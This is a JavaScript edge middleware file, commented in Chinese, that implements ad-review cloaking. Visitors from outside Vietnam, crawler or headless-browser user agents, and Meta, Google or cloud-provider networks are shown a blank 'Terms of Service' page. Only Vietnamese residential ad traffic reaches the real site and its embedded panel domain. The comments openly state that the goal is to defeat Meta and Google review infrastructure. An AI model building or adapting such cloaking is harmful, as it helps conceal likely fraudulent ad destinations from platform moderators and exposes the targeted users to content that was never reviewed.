/**
 * 全站中间件
 *  1) 准入判定（防审核爬虫）：国家 + UA 指纹 + ASN（数据中心/平台方）
 *     · 通过 → 正常站点
 *     · 不通过 → 无品牌「服务条款」页（200，URL 不变，noindex）
 *  2) 给正常站点响应补安全头（契约 §7.1 方案 A，frame-src 必须含面板域）
 *
 * 设计原则：宁可少拦真实用户，也要拦住平台审核基础设施。
 *   - 国家：cf.country !== 'VN' → 安全页（覆盖 Meta/Google 各地审核出口 IP）
 *   - UA  ：facebookexternalhit / facebookcatalog / meta-externalagent / AdsBot /
 *           HeadlessChrome / Puppeteer / Playwright / Selenium / curl / python-requests …
 *   - ASN ：Meta、Google、Microsoft、AWS、GCP、Azure、DigitalOcean、Linode、Vultr、
 *           OVH、Hetzner、Contabo、Oracle、阿里云、腾讯云（越南本地运营商不在其中）
 *   - 不用 Referer 判定：广告流量本来就是从 facebook.com 点进来的，会误伤真实用户
 */
const SAFE_PATH = '/safe';
const SAFE_ASSET = '/safe.html';

const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' https://connect.facebook.net",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: https:",
  "font-src 'self' data: https:",
  "connect-src 'self' https://annangourmet.makeup wss://annangourmet.makeup https://connect.facebook.net https://www.facebook.com",
  "frame-src 'self' https://annangourmet.makeup https://www.facebook.com",
  "base-uri 'self'",
  "form-action 'self'",
  "object-src 'none'",
].join('; ');

/* 爬虫/自动化 UA 特征（大小写不敏感） */
const BOT_UA = /(facebookexternalhit|facebookcatalog|meta-externalagent|meta-externalfetcher|facebot|adsbot|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|applebot|petalbot|semrushbot|ahrefsbot|mj12bot|dotbot|headlesschrome|phantomjs|puppeteer|playwright|selenium|webdriver|lighthouse|pagespeed|gtmetrix|pingdom|uptimerobot|curl\/|wget\/|python-requests|python-urllib|go-http-client|okhttp|axios\/|java\/|libwww-perl|scrapy|httpclient|node-fetch|undici)/i;

/* 平台方 / 数据中心 ASN（真实越南用户不会从这里来，除非挂 VPN） */
const BOT_ASN = new Set([
  32934,  // Facebook / Meta
  63293,  // Meta (Ireland)
  15169, 395747, 396982, // Google
  8075,   // Microsoft / Azure
  16509, 14618, // AWS
  396982, // Google Cloud
  14061,  // DigitalOcean
  63949,  // Linode / Akamai
  20473,  // Vultr
  16276,  // OVH
  24940,  // Hetzner
  51167,  // Contabo
  31898,  // Oracle Cloud
  45102,  // Alibaba Cloud
  132203, // Tencent Cloud
  9009,   // M247 (常见 VPN/代理出口)
  200651, // Flokinet 等托管
]);

/** 返回 'site' 或 'safe' */
function verdict(request, url) {
  const q = url.searchParams;

  /* 本地/联调覆盖：?__country=VN|US 、?__ua=… 、?__asn=32934 */
  const forcedCountry = (q.get('__country') || '').toUpperCase();
  const forcedUa = q.get('__ua');
  const forcedAsn = q.get('__asn');

  const cf = request.cf || {};
  const country = forcedCountry || String(cf.country || '').toUpperCase();
  const ua = forcedUa != null ? forcedUa : (request.headers.get('user-agent') || '');
  const asn = forcedAsn != null ? Number(forcedAsn) : Number(cf.asn || 0);

  /* 没有地理信息（本地 dev / pages 预览）→ 放行，除非显式给了 UA/ASN 特征 */
  if (!country) {
    if (forcedUa != null && BOT_UA.test(ua)) return 'safe';
    if (forcedAsn != null && BOT_ASN.has(asn)) return 'safe';
    return 'site';
  }

  if (country !== 'VN') return 'safe';
  if (ua && BOT_UA.test(ua)) return 'safe';
  if (asn && BOT_ASN.has(asn)) return 'safe';
  return 'site';
}

function withSecurityHeaders(res) {
  const h = new Headers(res.headers);
  h.set('Content-Security-Policy', CSP);
  h.set('X-Content-Type-Options', 'nosniff');
  h.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  h.set('Permissions-Policy', 'payment=(self), clipboard-write=(self)');
  h.set('X-DNS-Prefetch-Control', 'on');
  return new Response(res.body, { status: res.status, statusText: res.statusText, headers: h });
}

/** 返回安全页（服务条款）：200 + 不缓存 + 不进索引，URL 保持不变 */
async function serveSafePage(context, url) {
  let body;
  try {
    const asset = await context.env.ASSETS.fetch(new Request(new URL(SAFE_ASSET, url.origin).toString(), {
      headers: context.request.headers,
    }));
    body = await asset.text();
  } catch (e) {
    body = '<!doctype html><html lang="en"><meta charset="utf-8"><title>Terms of Service</title>' +
      '<body style="font-family:system-ui,sans-serif;padding:40px;max-width:760px;margin:0 auto;line-height:1.7">' +
      '<h1>Terms of Service</h1><p>Please review the terms before continuing.</p></body></html>';
  }
  return new Response(body, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'X-Robots-Tag': 'noindex, nofollow, noarchive',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; base-uri 'none'; form-action 'none'; object-src 'none'",
    },
  });
}

export async function onRequest(context) {
  const url = new URL(context.request.url);

  /* 安全页本身与基础文件放行（便于人工核对 / 爬虫读 robots） */
  if (url.pathname === SAFE_PATH || url.pathname === SAFE_ASSET ||
      url.pathname === '/favicon.ico' || url.pathname === '/robots.txt') {
    return withSecurityHeaders(await context.next());
  }

  if (verdict(context.request, url) === 'site') {
    return withSecurityHeaders(await context.next());
  }

  /* 判定不通过：整站（含 /assets、/data、/api、/bp）统一返回服务条款页 */
  return serveSafePage(context, url);
}
